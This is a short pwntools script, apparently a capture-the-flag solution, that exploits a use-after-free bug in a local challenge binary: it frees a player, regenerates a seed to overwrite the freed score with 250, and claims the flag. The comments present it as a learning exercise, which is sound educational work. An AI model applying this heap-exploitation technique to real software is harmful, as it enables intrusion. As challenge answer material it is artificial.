# this is a use-after-free heap exploitation challenge
# create a player, free() it, then renegerate the seed. 
# regenerating the seed causes 250 to be written into the same place as the freed player's score
# finally, check to see if the player has a high score and get the flag. 
# low point value because you might be able to get it by just pressing numbers. even still, its a good learning opportunity.
from pwn import *
p = process('../to_copy/program')
p.recvuntil('Selection: ')
p.sendline('1')
p.recvuntil('What is your name?: ')
p.sendline('dayton')
p.recvuntil('Selection: ')
p.sendline('2')
p.recvuntil('Selection: ')
p.sendline('5')
p.recvuntil('Selection: ')
p.sendline('3')
p.interactive()